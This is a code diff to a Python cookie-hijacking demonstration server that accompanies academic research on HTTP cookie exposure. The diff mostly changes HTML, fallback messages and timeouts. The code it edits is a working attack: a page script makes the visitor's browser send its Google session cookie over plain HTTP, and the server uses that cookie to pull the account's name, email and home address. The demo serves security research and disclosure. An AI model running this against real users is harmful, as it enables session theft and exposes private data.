@@ -25,7 +25,7 @@ user_complete = {}	# dict to track packet status if chunked
 user_start = {}		# dict to track user packet start
 cookie_dict = {} 	# dict to store the user cookies
 img_dict =  {} 		# dict to store the pared image URL
-captive_list = ["clients3.google.com", "akamaitechnologies.com", "apple.com", "appleiphonecell.com", "itools.info", "ibook.info", "airport.us", "thinkdifferent.us", "akamaiedge.net", "msftncsi.com", "microsoft.com"]
+captive_list = ["clients3.google.com", "akamaitechnologies.com", ".apple.com", "appleiphonecell.com", "itools.info", "ibook.info", "airport.us", "thinkdifferent.us", "akamaiedge.net", "msftncsi.com", ".microsoft.com"]
 
 
 
@@ -139,19 +139,19 @@ def make_request (user_ip, cookie):
 	if len(name_div) > 0:
 		name = name_div[0].text
 	else:
-		name = " "
+		name = "Not Found"
 
 	email_div = soup.findAll("div", { "class" : "gb_Db"})
 	if len(email_div) > 0:
 		email = email_div[0].text.split(" ")[0]
 	else:
-		email = " "
+		email = "Not Found"
 
 	home_div = soup.findAll("div", { "class" : "vk_sh vk_bk"})
 	if len(home_div) > 0:
 		home = home_div[0].text.split("-")[1][1:]
 	else:
-		home = " "
+		home = "Not Found"
 
 	return name, email, home
 
@@ -218,7 +218,7 @@ def run_response_server():
 				if self.path == "/usr_cookie_attack_page.html":
 					
 					now = time.time()
-					timeout = now + 15
+					timeout = now + 12
 
 				 	while cookie_flag == 0:
 
@@ -232,36 +232,32 @@ def run_response_server():
 								self.end_headers()
 
 								#make changes here to make the HTML look more facny
-								self.wfile.write("<p>&nbsp;</p><h1 style=\"text-align:center\"><span style=\"font-family:arial,helvetica,sans-serif\"><big><span style=\"font-size:60px\">"\
-									"<strong><span style=\"color:#0066ff\">G</span><span style=\"color:#FF0000\">o</span><span style=\"color:#FFD700\">o</span><span style=\"color:#0066ff\">g"\
-									"</span><span style=\"color:#00cc33\">l</span><span style=\"color:#FF0000\">e</span></strong></span> <span style=\"font-size:55px\"><strong>Cookie Hijacking Demo"\
-									"</strong></span></big></span></h1><hr align=\"center\" style=\"width:820px\"/><table align=\"center\" border=\"0\" cellpadding=\"1\" cellspacing=\"15\" style=\"width:800px\">"\
-									"<tbody><tr><td><span style=\"font-size:28px\"><span style=\"color:#0066ff\"><u><strong><span style=\"font-family:arial,helvetica,sans-serif\">The Talk</span></strong></u>"\
-									"</span></span></td></tr><tr><td style=\"text-align:justify\"><p><span style=\"font-size:20px\"><span style=\"font-family:arial,helvetica,sans-serif\">This cookie hijacking demo "\
-									"is a demonstration of the research by Suphannee Sivakorn, Iasonas Polakis, and Angelos D. Keromytis from Columbia University. The original talk, titled &ldquo;<strong><em>The Cracked"\
-									"Cookie Jar: HTTP Cookie Hijacking and the Exposure of Private Information</em></strong>&rdquo; will be presented during session 9 (Don&#39;t go on the Web) on May 25, 2016 at the 37th "\
-									"IEEE Security &amp; Privacy Conference</span></span>.</p></td></tr></tbody></table><table align=\"center\" border=\"0\" cellpadding=\"1\" cellspacing=\"15\" style=\"width:800px\"><tbody>"\
-									"<tr><td style=\"text-align: center;\"><span style=\"color:#0066ff\"><u><strong><span style=\"font-size:28px\"><span style=\"font-family:arial,helvetica,sans-serif\">Personal Information</span>"\
-									"</span></strong></u></span></td></tr><tr><td style=\"text-align:justify\"><table align=\"center\" border=\"0\" cellpadding=\"1\" cellspacing=\"1\" style=\"width:500px\"><tbody><tr><td>"\
-									"<img src=\"usr_cookie_attack_photo.jpg\" alt=\"profile_picture\" style=\"height:150px; width:150px\" /></td><td "\
-									"style=\"text-align:left\"><span style=\"font-size:20px\">&nbsp; &nbsp;&nbsp;</span></td><td><table align=\"left\" border=\"0\" cellpadding=\"1\" cellspacing=\"1\" style=\"line-height:1.6; width:300px\">"\
-									"<tbody><tr><td style=\"text-align:center\"><p><span style=\"font-size:18px\"><span style=\"font-family:arial,helvetica,sans-serif\"><strong>"+name+"</strong></span></span></p></td></tr><tr>"\
-									"<td style=\"text-align:center\"><span style=\"font-size:18px\"><span style=\"font-family:arial,helvetica,sans-serif\">"+email+"</span></span></td></tr><tr><td style=\"text-align:left\">"\
-									"<p style=\"text-align:center\"><span style=\"font-size:18px\"><span style=\"font-family:arial,helvetica,sans-serif\">"+home+"</span></span></p></td></tr></tbody></table><p>"\
-									"&nbsp;</p></td></tr></tbody></table></td></tr></tbody></table><table align=\"center\" border=\"0\" cellpadding=\"1\" cellspacing=\"15\" style=\"width:800px\"><tbody><tr><td><span style=\"font-size:28px\">"\
-									"<span style=\"color:#0066ff\"><u><strong><span style=\"font-family:arial,helvetica,sans-serif\">How it Works</span></strong></u></span></span></td></tr><tr><td style=\"text-align:justify\"><p><span style=\"font-"\
-									"size:20px\"><span style=\"font-family:arial,helvetica,sans-serif\">Google does not currently enforce ubiquitous encryption of incoming requests. By allowing HTTP connections to proceed, a malicious entity can cause "\
-									"a victim&rsquo;s browser to make requests in the clear, including Google session cookies. These cookies can then be used to make requests to Google which divulge sensitive information about the account in use. "\
-									"This POC&nbsp;works by including a resource from google.com using HTTP, which allows us to recover the user&rsquo;s Google session cookie. We then make requests to Google to elicit the sensitive information. "\
-									"We perform this attack after you click a button, but a malicious access point could easily inject references to google.com resources into any HTTP&nbsp;based response.</span></span></p></td></tr></tbody></table>"\
-									"<table align=\"center\" border=\"0\" cellpadding=\"1\" cellspacing=\"15\" style=\"width:800px\"><tbody><tr><td style=\"text-align:center\"><p><span style=\"font-size:17px\"><span style=\"font-family:arial,helvetica,"\
-									"sans-serif\">*This demo was prepared by Mohammad Taha Khan, Chris Kanich and Steve Checkoway from the University of Illinois at Chicago</span></span>.</p></td></tr></tbody></table><hr align=\"center\" style=\"width:820px\"/><p>&nbsp;</p>")
+								self.wfile.write("<p>&nbsp;</p><h1 style=\"text-align:center\"><span style=\"font-family:arial,helvetica,sans-serif\"><big><span style=\"font-size:60px\"><strong><span style=\"color:#0066ff\">G</span><span style=\"color:#FF0000\">o</span><span style=\"color:#FFD700\">o</span><span style=\"color:#0066ff\">g</span><span style=\"color:#00cc33\">l</span>"\
+									"<span style=\"color:#FF0000\">e</span></strong></span> <span style=\"font-size:55px\"><strong>Cookie Hijacking Demo</strong></span></big></span></h1><hr align=\"center\" style=\"width:820px\"><p>&nbsp;</p><table align=\"center\" border=\"0\" cellpadding=\"1\" cellspacing=\"15\" style=\"width:800px\"><tbody><tr><td><span style=\"font-family:arial,helvetica,sans-serif\"><span style=\"font-size:28px\">"\
+									"<span style=\"color:#0066ff\"><u><strong>The Talk</strong></u>&nbsp;</span></span></span></td></tr><tr><td style=\"text-align:justify\"><p><span style=\"font-family:arial,helvetica,sans-serif\"><span style=\"font-size:20px\">This cookie hijacking demo &quot;is a demonstration of the research by Suphannee Sivakorn, Iasonas Polakis, and Angelos D. Keromytis from"\
+									" Columbia University. The original talk, titled &ldquo;<strong><em>The Cracked&nbsp;Cookie&nbsp;Jar: HTTP Cookie Hijacking and the Exposure of Private Information&quot;</em></strong>&nbsp;will be presented during session 9 (Don&#39;t go on the Web) on May 25, 2016 at the 37th &quot;IEEE Security &amp; Privacy Conference</span>.</span></p></td></tr></tbody></table>"\
+									"<table align=\"center\" border=\"0\" cellpadding=\"1\" cellspacing=\"15\" style=\"width:800px\"><tbody><tr><td style=\"text-align:center\"><span style=\"font-family:arial,helvetica,sans-serif\"><span style=\"color:#0066ff\"><u><strong><span style=\"font-size:28px\">Personal Information</span></strong></u></span></span></td></tr><tr><td style=\"text-align:justify\">"\
+									"<table align=\"center\" border=\"0\" cellpadding=\"1\" cellspacing=\"1\" style=\"width:600px\"><tbody><tr><td><span style=\"font-family:arial,helvetica,sans-serif\"><img alt=\"profile_picture\" src=\"usr_cookie_attack_photo.jpg\" style=\"height:150px; width:150px\" /></span></td><td style=\"text-align:center\"><span style=\"font-family:arial,helvetica,sans-serif\">"\
+									"<span style=\"font-size:20px\">&nbsp; &nbsp; &nbsp;&nbsp;</span></span></td><td><table border=\"0\" cellpadding=\"5\" cellspacing=\"1\" style=\"width:500px\"><tbody><tr><td style=\"text-align:center\"><span style=\"font-family:arial,helvetica,sans-serif\"><strong><span style=\"font-size:18px\">Name:&nbsp;</span></strong></span></td><td><span style=\"font-family:arial,"\
+									"helvetica,sans-serif\"><span style=\"font-size:18px\">"+name+"</span></span></td></tr><tr><td style=\"text-align:center\"><span style=\"font-family:arial,helvetica,sans-serif\"><span style=\"font-size:18px\"><strong>Email:&nbsp;</strong></span></span></td><td><span style=\"font-family:arial,helvetica,sans-serif\"><span style=\"font-size:18px\">"+email+"</span>"\
+									"</span></td></tr><tr><td style=\"text-align:center\"><span style=\"font-family:arial,helvetica,sans-serif\"><strong><span style=\"font-size:18px\">Home Address:</span></strong></span></td><td><span style=\"font-family:arial,helvetica,sans-serif\"><span style=\"font-size:16px\">"+home+"</span></span></td></tr></tbody></table></td></tr></tbody>"\
+									"</table></td></tr></tbody></table><table align=\"center\" border=\"0\" cellpadding=\"1\" cellspacing=\"15\" style=\"width:800px\"><tbody><tr><td><span style=\"font-family:arial,helvetica,sans-serif\"><span style=\"font-size:28px\"><span style=\"color:#0066ff\"><u><strong>How it Works</strong></u></span></span></span></td></tr><tr><td style=\"text-align:justify\"><p>"\
+									"<span style=\"font-family:arial,helvetica,sans-serif\"><span style=\"font-size:20px\">Google does not currently enforce ubiquitous encryption of incoming requests. By allowing HTTP connections to proceed, a malicious entity can cause &quot;a victim&rsquo;s browser to make requests in the clear, including Google session cookies. These cookies can then be used to make requests"\
+									" to Google which divulge sensitive information about the account in use. &quot;This POC&nbsp;works by including a resource from google.com using HTTP, which allows us to recover the user&rsquo;s Google session cookie. We then make requests to Google to elicit the sensitive information. &quot;We perform this attack after you click a button, but a malicious access point could easily "\
+									"inject references to google.com resources into any HTTP&nbsp;based response.</span></span></p></td></tr></tbody></table><table align=\"center\" border=\"0\" cellpadding=\"1\" cellspacing=\"15\" style=\"width:800px\"><tbody><tr><td style=\"text-align:center\"><p><span style=\"font-family:arial,helvetica,sans-serif\"><span style=\"font-size:16px\">*This demo was prepared by Mohammad Taha Khan, "\
+									"Chris Kanich and Steve Checkoway from the University of Illinois at Chicago.</span></span></p></td></tr></tbody></table><hr align=\"center\" style=\"width:820px\"><p>&nbsp;</p>")
 
 							cookie_flag = 1
 							return
 
 						if time.time() > timeout:
-							self.send_error(408,'Please try again while signed in with your google account')
+							self.send_response(200)
+							self.send_header('Content-type','text/html')
+							self.end_headers()
+							self.wfile.write("<p>&nbsp;</p><h1 style=\"text-align:center\"><span style=\"font-family:arial,helvetica,sans-serif\"><big><span style=\"font-size:60px\"><strong><span style=\"color:#0066ff\">G</span><span style=\"color:#FF0000\">o</span><span style=\"color:#FFD700\">o</span><span style=\"color:#0066ff\">g</span><span style=\"color:#00cc33\">l</span><span style=\"color:#FF0000\">e</span>"\
+								"</strong></span> <span style=\"font-size:55px\"><strong>Cookie Hijacking Demo</strong></span></big></span></h1><hr align=\"center\" style=\"width:820px\"><p>&nbsp;</p><table align=\"center\" border=\"0\" cellpadding=\"1\" cellspacing=\"15\" style=\"width:800px\"><tbody><tr><td style=\"text-align:center\"><span style=\"font-family:arial,helvetica,sans-serif\"><span style=\"font-size:28px\"><span style=\"color:#FF0000\">"\
+								"<u><strong>Please Try Again!</strong></u></span></span></span></td></tr></tbody></table><table align=\"center\" border=\"0\" cellpadding=\"1\" cellspacing=\"15\" style=\"width:800px\"><tbody><tr><td style=\"text-align:center\"><span style=\"font-family:arial,helvetica,sans-serif\"><span style=\"font-size:20px\">Sorry, we could not extract your Google cookies. Kindly make sure you have "\
+								"an active logged in user session and try again.</span></span></td></tr><tr><td style=\"text-align:justify\">&nbsp;</td></tr></tbody></table><hr align=\"center\" style=\"width:820px\"><p style=\"text-align:justify\">&nbsp;</p>")							
 							return
 
 				elif self.path == "/usr_cookie_attack_photo.jpg":
@@ -288,8 +284,8 @@ def run_response_server():
 						"what information can be extracted from the cookies your browser sends in the clear to Google. This attack only provides limited visibility, and does not allow us to control your Google account in any way. All data is shown only to you, and we do "\
 						"not save any of this information.</span></span></p></td></tr></tbody></table><br><div align=\"center\"><style>.myButton {background-color:#cf2323;-moz-border-radius:8px;-webkit-border-radius:8px;border-radius:8px;border:1px solid #ffffff;display:in"\
 						"line-block;cursor:pointer;color:#ffffff;font-family:Arial;font-size:20px;padding:14px 37px;text-decoration:none;}</style><button id=\"demoBtn\" class=\"mybutton\">View Personal Information</button><script>document.getElementById(\"demoBtn\").onclick="\
-						"function(){document.getElementById(\"demoImg\").src = \"http://www.google.com/thisimagedoesnotexist.png\";window.setTimeout(window.location.href = \"http://172.16.42.1:8000/usr_cookie_attack_page.html\",10000);}</script></div><br><table align=\"center\" border=\"0\" cellpadding=\"1\""\
-						"cellspacing=\"15\" style=\"width:800px\"><tbody><tr><td style=\"text-align:center\"><p><span style=\"font-size:17px\" ><span style=\"font-family:arial,helvetica,sans-serif\" >*This demo was prepared by Mohammad Taha Khan, Chris Kanich and Steve Checkoway from the University "\
+						"function(){document.getElementById(\"demoImg\").src = \"http://www.google.com/thisimagedoesnotexist.png\";window.setTimeout(window.location.href = \"http://172.16.42.1:8000/usr_cookie_attack_page.html\",20000);}</script></div><br><table align=\"center\" border=\"0\" cellpadding=\"1\""\
+						"cellspacing=\"15\" style=\"width:800px\"><tbody><tr><td style=\"text-align:center\"><p><span style=\"font-size:16px\" ><span style=\"font-family:arial,helvetica,sans-serif\" >*This demo was prepared by Mohammad Taha Khan, Chris Kanich and Steve Checkoway from the University "\
 						"of Illinois at Chicago</span></span>.</p></td></tr></tbody></table><hr align=\"center\" style=\"width:820px\"><p>&nbsp;</p>")
 					return
 
